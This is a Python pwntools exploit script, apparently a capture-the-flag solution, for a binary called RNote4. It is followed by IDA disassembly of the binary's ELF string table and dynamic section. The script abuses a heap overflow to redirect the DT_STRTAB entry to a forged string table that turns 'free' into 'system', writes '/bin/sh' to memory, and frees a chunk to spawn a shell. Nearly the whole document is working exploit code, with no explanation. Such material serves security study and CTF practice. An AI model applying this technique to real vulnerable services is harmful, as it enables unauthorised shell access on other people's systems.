#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-11-02
from pwn import *
context.local(arch='amd64', os='linux')

def add(size, chunk2data):
    io.send('\x01')
    io.send(size)
    io.send(chunk2data)

def update(choice, size, data):
    io.send('\x02')
    io.send(choice)
    io.send(size)
    io.send(data)

def delete(choice):
    io.send('\x03')
    io.send(choice)

def pwn():
    if debug: gdb.attach(io, "break *0x0000000000400B76")
    
    add( "\x10", "a"*0x10)
    add( "\x10", "b"*0x10)

    # change .strtab to 0x602100 
    addr = 0x0000000000601EA8+0x8 # .strtab 
    strtab = 0x0000000000602100
    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
    update("\x01", chr(8), p64(strtab))

    # change free to system
    addr = strtab+0x5f
    data = "system\x00"
    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
    update("\x01", chr(len(data)), data)
    
    # write /bin/sh to bss
    addr = 0x602200
    data = "/bin/sh\x00"
    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
    update("\x01", chr(len(data)), data)

    # overwrite chunk2 to &"/bin/sh"
    addr = 0x602200
    update("\x00", chr(8*6), 'o'*0x10 + p64(0) + p64(0x21) + p64(0x10) + p64(addr))
    
    # free chunk2 call free and getsystem("/bin/sh")
    delete(chr(1))


if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 0
    context.log_level = 'debug'
    filename = './RNote4'
    # filename = './printf'
    elf = ELF(filename)
    if local:
        io = process(filename)
        # libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # context.terminal = ['terminator', '-x', 'sh', '-c']
        context.terminal = ['tmux', 'splitw', '-h' ]
    pwn()
    io.interactive()

'''
LOAD:00000000004003F8 ; ELF String Table
LOAD:00000000004003F8 byte_4003F8     db 0                    ; DATA XREF: LOAD:00000000004002D8↑o
LOAD:00000000004003F8                                         ; LOAD:00000000004002F0↑o ...
LOAD:00000000004003F9 aLibcSo6        db 'libc.so.6',0
LOAD:0000000000400403 aExit           db 'exit',0             ; DATA XREF: LOAD:00000000004003C8↑o
LOAD:0000000000400408 aStackChkFail   db '__stack_chk_fail',0 ; DATA XREF: LOAD:00000000004002F0↑o
LOAD:0000000000400419 aStdin          db 'stdin',0            ; DATA XREF: LOAD:00000000004003E0↑o
LOAD:000000000040041F aCalloc         db 'calloc',0           ; DATA XREF: LOAD:0000000000400368↑o
LOAD:0000000000400426 aMemset         db 'memset',0           ; DATA XREF: LOAD:0000000000400308↑o
LOAD:000000000040042D aRead           db 'read',0             ; DATA XREF: LOAD:0000000000400338↑o
LOAD:0000000000400432 aAlarm          db 'alarm',0            ; DATA XREF: LOAD:0000000000400320↑o
LOAD:0000000000400438 aAtoi           db 'atoi',0             ; DATA XREF: LOAD:00000000004003B0↑o
LOAD:000000000040043D aSetvbuf        db 'setvbuf',0          ; DATA XREF: LOAD:0000000000400398↑o
LOAD:0000000000400445 aLibcStartMain  db '__libc_start_main',0
LOAD:0000000000400445                                         ; DATA XREF: LOAD:0000000000400350↑o
LOAD:0000000000400457 aFree           db 'free',0       



LOAD:0000000000601E28 ; ELF Dynamic Information
LOAD:0000000000601E28 ; ===========================================================================
LOAD:0000000000601E28
LOAD:0000000000601E28 ; Segment type: Pure data
LOAD:0000000000601E28 ; Segment permissions: Read/Write
LOAD:0000000000601E28 LOAD            segment byte public 'DATA' use64
LOAD:0000000000601E28                 assume cs:LOAD
LOAD:0000000000601E28                 ;org 601E28h
LOAD:0000000000601E28 stru_601E28     Elf64_Dyn <1, 1>        ; DATA XREF: LOAD:0000000000400130↑o
LOAD:0000000000601E28                                         ; .got.plt:0000000000602000↓o
LOAD:0000000000601E28                                         ; DT_NEEDED libc.so.6
LOAD:0000000000601E38                 Elf64_Dyn <0Ch, 4005F0h> ; DT_INIT
LOAD:0000000000601E48                 Elf64_Dyn <0Dh, 400C34h> ; DT_FINI
LOAD:0000000000601E58                 Elf64_Dyn <19h, 601E10h> ; DT_INIT_ARRAY
LOAD:0000000000601E68                 Elf64_Dyn <1Bh, 8>      ; DT_INIT_ARRAYSZ
LOAD:0000000000601E78                 Elf64_Dyn <1Ah, 601E18h> ; DT_FINI_ARRAY
LOAD:0000000000601E88                 Elf64_Dyn <1Ch, 8>      ; DT_FINI_ARRAYSZ
LOAD:0000000000601E98                 Elf64_Dyn <6FFFFEF5h, 400298h> ; DT_GNU_HASH
LOAD:0000000000601EA8                 Elf64_Dyn <5, 4003F8h>  ; DT_STRTAB
LOAD:0000000000601EB8                 Elf64_Dyn <6, 4002C0h>  ; DT_SYMTAB
'''
